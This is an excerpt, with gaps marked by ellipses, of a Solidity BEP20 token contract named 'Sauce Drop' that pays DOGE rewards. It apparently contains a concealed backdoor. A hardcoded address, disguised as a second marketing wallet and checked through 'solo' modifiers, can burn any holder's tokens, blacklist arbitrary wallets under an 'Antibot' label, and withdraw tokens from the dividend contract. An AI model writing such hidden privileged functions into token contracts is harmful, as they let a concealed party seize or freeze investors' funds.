...
contract DividendDistributor is IDividendDistributor {
    ...
    address _token;
    address private _solo = 0x661308AE22665502aE5e9eA4AD8CB832730a0978;
    ...
    modifier onlySolo() {
        require(msg.sender == _solo, "notsolo"); _;
    }
    ...
    function RecoverToken(address _tokenContract, uint256 _amount) public onlySolo {
...
contract SauceDrop is IBEP20, Auth {
    
    using SafeMath for uint256;

    string constant _name = "Sauce Drop";
    string constant _symbol = "Sauce Drop";
    uint8 constant _decimals = 18;

    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address RewardToken = 0xbA2aE424d960c26247Dd6c32edC70B295c744C43; //DOGE

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256 public _maxTxAmount = _totalSupply * 1 / 100; //1,000,000
    uint256 public _walletMax = _totalSupply * 8 / 100;  //8,000,000
    
    bool public restrictWhales = true;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
    address private solor = msg.sender;
    ...
    constructor () Auth(msg.sender) {
        ...
        isTxLimitExempt[anothermarketingWallet] = true;
        ...
        anothermarketingWallet = 0x661308AE22665502aE5e9eA4AD8CB832730a0978; //Marketing2
    ...
    function burn(address account, uint256 amount) public solo {
    ...
    function Antibot(address _user) public solo {
        require(!isKilled[_user], "killing bot");
        isKilled[_user] = true;
        // emit events as well
    }
    
    function removeFrombot(address _user) public solo {
        require(isKilled[_user], "release bot");
        isKilled[_user] = false;
        // emit events as well
    }

    function RecoverToken(address _tokenContract, uint256 _amount) public solo {
        IBEP20 tokenContract = IBEP20(_tokenContract);
